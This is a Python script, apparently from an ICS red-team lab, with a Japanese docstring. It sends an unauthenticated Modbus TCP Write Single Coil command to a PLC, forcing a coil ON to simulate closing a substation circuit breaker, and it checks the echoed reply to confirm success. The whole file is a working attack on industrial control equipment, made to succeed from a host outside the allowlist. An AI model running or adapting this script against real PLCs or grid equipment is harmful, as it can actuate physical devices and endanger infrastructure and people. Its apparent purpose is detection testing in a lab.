import socket

"""
Phase8-2(Modbusサイクル) 8-1: Write Single Coil(0x05)攻撃、allowlist外送信元から。

決定事項#4のSignal1(DNP3)と対比する形で設計:
  DNP3: DIRECT_OPERATE(fc=5) = 制御を直接変更する書き込み操作
  Modbus: Write Single Coil(0x05) = コイル(ブール出力、例: 遮断器の開閉)を
          直接書き換える操作。関数コードの番号が5で一致するのは偶然だが、
          「危険度分類上、両プロトコルで最も直接的な制御系操作」という
          位置づけは完全に対応する。

Modbusサイクル固有の構造的性質: プロトコル自体に認証機構が無いため、
allowlist(vector/ot_allowlist.csv、現状10.0.10.10のみ登録)に載っていない
送信元(本スクリプトはred-team、10.0.10.99)からでも、正規のマスターと
全く区別のつかない有効なWriteリクエストが成立してしまう。これは
GOOSEサイクルのMACなりすまし(決定事項#36、既知の送信元を騙る)とは異なり、
「そもそも送信元を騙る必要すらない」という、より根源的な脆弱性を示す。

Modbus TCP ADU構造(CRC不要、DNP3よりシンプル):
  MBAP Header(7バイト): Transaction ID(2) + Protocol ID(2, must be 0x0000)
                        + Length(2) + Unit ID(1)
  PDU: Function Code(1) + Output Address(2) + Output Value(2)
       (Write Single Coilの場合。Output Value: 0xFF00=ON, 0x0000=OFF)
"""

TARGET_IP = "10.0.30.11"  # sub_b_plc_01
TARGET_PORT = 502
UNIT_ID = 0x01
COIL_ADDRESS = 0x0000  # コイル0(例: 変電所遮断器の開閉状態を模す)


def build_write_single_coil_request(transaction_id: int, coil_addr: int, turn_on: bool) -> bytes:
    protocol_id = 0x0000
    length = 0x0006  # Unit ID(1) + FC(1) + Addr(2) + Value(2)
    function_code = 0x05
    output_value = 0xFF00 if turn_on else 0x0000

    mbap = (
        transaction_id.to_bytes(2, "big")
        + protocol_id.to_bytes(2, "big")
        + length.to_bytes(2, "big")
        + bytes([UNIT_ID])
    )
    pdu = (
        bytes([function_code])
        + coil_addr.to_bytes(2, "big")
        + output_value.to_bytes(2, "big")
    )
    return mbap + pdu


def run_attack():
    print(f"[*] Starting Modbus Write Single Coil Attack on {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Source: red-team (10.0.10.99, allowlist外 - vector/ot_allowlist.csvに未登録)")
    print(f"[*] Target coil: {COIL_ADDRESS} (ON書き込み、遮断器強制投入を想定)")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))

        request = build_write_single_coil_request(transaction_id=1, coil_addr=COIL_ADDRESS, turn_on=True)
        print(f"[*] Sending request: {request.hex()}")
        s.send(request)

        response = s.recv(256)
        print(f"[+] Response: {response.hex()}")

        # Write Single Coilの正常応答は、リクエストのエコーバック
        # (Function Code + Address + Valueがそのまま返る)
        if response[7:8] == bytes([0x05]):
            print("[+] Write Single Coil accepted (echoed back function code 0x05)")
        else:
            print(f"[!] Unexpected response function code: {response[7:8].hex()}")

        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")

    print("[*] Modbus Write Single Coil Attack Completed.")


if __name__ == "__main__":
    run_attack()
